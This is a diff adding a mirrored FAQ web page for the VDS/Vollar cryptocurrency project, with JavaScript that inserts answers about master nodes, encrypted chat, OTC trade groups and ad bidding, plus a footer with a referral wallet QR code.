+                    '                <p class="faq-body">To create a super master node you need an address with a UTXO of 10,000 Vollar, and they receive definite Vollar rewards. To create a light master node you need an address that has a UTXO of 100 Vollar, and the 12 spots in the first level of it’s Trust Stamp System full; they get the chance to win The Lottery and earn Bitcoin as their reward.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What’s the difference between super master nodes and light master nodes?</p>\n' +
+                    '                <p class="faq-body">To create a super master node you need an address with a UTXO of 10,000 Vollar, and they receive definite Vollar rewards. To create a light master node you need an address that has a UTXO of 100 Vollar, and the 12 spots in the first level of it’s Trust Stamp System full; they get the chance to win The Lottery and earn Bitcoin as their reward.</p>\n' +
+                    '            </div>';
+            } else if(item == 7){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Is it absolutely safe to transmit information and document via Secret Chat?</p>\n' +
+                    '                <p class="faq-body">Yes. Secret Chat is an encrypted, peer-to-peer communication tool in VDS’s distributed, anonymous network. There are no servers that store information in the middle; it is all cached on the user-end.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Are there any additional costs for the use of secret chat?</p>\n' +
+                    '                <p class="faq-body">No. Once you have a VID there are no other costs for using Secret Chat. The only costs that you may encounter are if an admin has decided to set a fee for a group you want to join.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How many groups can be created by single VID?</p>\n' +
+                    '                <p class="faq-body">Only one group can be created per VID.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why am I unable to add friends?</p>\n' +
+                    '                <p class="faq-body">Please make sure the scanned QR Code or friend’s VID address that you typed in is correct.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why is it necessary for both parties to be online in order to add friends or chat?</p>\n' +
+                    '                <p class="faq-body">Adding offline friends is only achieved because the server has kept your information and request. In order to ensure chatting safety and security, VDS provides no central server, but instead uses distributed master nodes for information service. Since there are no 3rd party server or institutions that store the information, it requires that both parties be online simultaneously to add friends or chat.</p>\n' +
+                    '            </div>';
+            } else if(item == 8){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Are OTC group trades safe/reliable?</p>\n' +
+                    '                <p class="faq-body">The seller’s Vollar will be locked up through smart contracts in OTC trade group and paid to the buying address at the “click of receipt confirmation” after collection. The whole transaction process is supervised. Whenever disputes arise, the group administrators will be called upon for arbitration and finalize which party the currency goes to.</p>\n' +
+                    '                <p class="faq-body">The history records of each OTC group will be shown to the public for traders’ reference. Therefore, admins in the OTC trade groups will ensure the orderly conduct of each transaction for their own sake.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How are disputes settled in OTC Trade?</p>\n' +
+                    '                <p class="faq-body">Both parties present their evidence and the group administrator decides which party the currency will go to.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Do I use personal bank accounts in OTC Trade?</p>\n' +
+                    '                <p class="faq-body">Not necessarily. You’re not obligated to use real user information in VDS.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do you startup an OTC group?</p>\n' +
+                    '                <p class="faq-body">In each Game, the VIDs that enter the top 100 (measured by their fission-weighted score) are granted the qualifications to startup an OTC trade group.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I join in multiple OTC trade groups?</p>\n' +
+                    '                <p class="faq-body">Yes, you may join various OTC trade groups and trade Vollar with multiple currencies.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">What currencies can I exchange Vollar with?</p>\n' +
+                    '                <p class="faq-body">This depends on the OTC groups you join in and what countries/currencies they are connected to. You may join multiple OTC trade groups with different currencies so as to increase your selection categories.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Where does the revenue of OTC group administrators come from?</p>\n' +
+                    '                <p class="faq-body">Group administrators are the arbitrators that ensure every trade is fair. They collect fees from this.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Am I allowed to post only one buy or sell order?</p>\n' +
+                    '                <p class="faq-body">Yes, only one order can be posted at a time per VID. This is designed to improve transaction quality and speed.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do I create my own group?</p>\n' +
+                    '                <p class="faq-body">Invite VIDS and fill in all 12 spots on the first level of your Trust Stamp System. The system will then grant you permission to create the group.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">How do I create my own OTC trade group?</p>\n' +
+                    '                <p class="faq-body">An administrator that wishes to start the OTC function after group creation is required to first rank Top 100 in one game phase. VID addresses that meet this requirement will be granted the rights to start one OTC trade group. After that, this VID is no longer counted as one of the “top 100” in future games, regardless of their fission-weighted score.</p>\n' +
+                    '            </div>';
+            } else if(item == 9){
+                body = '<div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Is there any content restriction on VAD publishing?</p>\n' +
+                    '                <p class="faq-body">No restrictions on the publishing content except for the byte limit, which is limited to 1 KB.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">When someone out-bids me on a VAD, why can’t I raise the price?</p>\n' +
+                    '                <p class="faq-body">Each Ad spot can only accept one bidding offer per VID per 10 blocks.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">My Ad didn’t come out after winning the bid. Why is that?</p>\n' +
+                    '                <p class="faq-body">The winning bid’s Ad contents will be published 60 blocks after the bid ends. You can refer to the “publishing next” page in the app for more specific information.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why does the Vollar used when making bids get frozen?</p>\n' +
+                    '                <p class="faq-body">This Vollar is frozen to guarantee you have the money to pay for the Ad that you’ve bid on. It will unfreeze automatically if another VID out-bids you.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">My offer is exactly the same with the winning bidder’s price, why didn’t I win?</p>\n' +
+                    '                <p class="faq-body">If there is more than one bidder with same size, broadcast rights go to the first bid recorded on the VDS chain. In other words, if the bids are the same amount, whoever made their bid the earliest is the winner.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">When Vollar is spent on a VAD bid to whom does it go?</p>\n' +
+                    '                <p class="faq-body">All Vollar used to bid for VAD will be paid directly to super master nodes.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">I’d want to bid on an Ad. Why can’t I do it?</p>\n' +
+                    '                <p class="faq-body">Vollar used to bid on Ads will be deducted from your VDS address. Please make sure you have a UTXO with at least 100 Vollar under the VDS attempting to make the bid.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Can I simultaneously bid for multiple Ad spots?</p>\n' +
+                    '                <p class="faq-body">Yes. Under your VID address, one UTXO with more than 100 Vollar will be locked up for each Ad spot you’re bidding on. Supposing you have plenty of UTXOs with more than 100 Vollar, they can all be used to bid for other Ad spots.</p>\n' +
+                    '            </div>\n' +
+                    '            <div class="faq-body-info">\n' +
+                    '                <p class="faq-title">Why are anonymous addresses unable to create VIDs or make VAD Ad bids?</p>\n' +
+                    '                <p class="faq-body">Anonymous addresses are untraceable, so the system is unable to make command judgments, and there is no way to successfully complete operations.</p>\n' +
+                    '            </div>';
+            }
+
+            $('.faq-container-r').empty();
+            $('.faq-container-r').append('<p style="font-size:20px;color:white;">'+body+'</p>');
+        }
+    );
+</script><link href="statics/css/footer.css" rel="stylesheet">
+
+<div class="footer-bg">
+    <div class="footer-nav">
+        <div class="footer-nav-left">
+            <img style="width:163px;height:113px;" src="statics/images/img-banner-vds-1.png">
+        </div>
+        <div class="footer-nav-right">
+            <table style="border-collapse:separate; border-spacing:110px 20px;">
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td1">Introduction</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Download</td>
+                    <td noWrap="noWrap" class="footer-nav-td1">Other</td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="whats.html">What's V</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">APP/PC</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="faq.html">FAQ</a></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="cex.html">CEX</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="source.html">Other</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+                <tr>
+                    <td noWrap="noWrap" class="footer-nav-td2"><a href="game.html">Top 10</a></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                    <td noWrap="noWrap" class="footer-nav-td2"></td>
+                </tr>
+            </table>
+        </div>
+        <div class="footer-nav-qrcode">
+            <div class="qrcode-container">
+                <div style="background: #FFFFFF;width:160px; height:160px;padding: 10px;border-radius:8px;margin: 0 auto;">
+                    <div id="qrcode"></div>
+                </div>
+                <p>Join My Team! Activate Your VID!</p>
+                <p class="addr-hidden" title="VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD">VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD</p>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<script>
+    var qrcode = new QRCode(document.getElementById("qrcode"), {
+        text: "VcbKd8K5tgEv9a5iphhVqttmbQh7qa67CYD",
+        width: 140,
+        height: 140,
+        colorDark : "#000000",
+        colorLight : "#ffffff",
+        correctLevel : QRCode.CorrectLevel.H
+    });
+</script>
+        </div>
+    </body>
+
+<!-- Mirrored from www.vds.nz/faq by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Jun 2019 02:55:51 GMT -->
+</html>
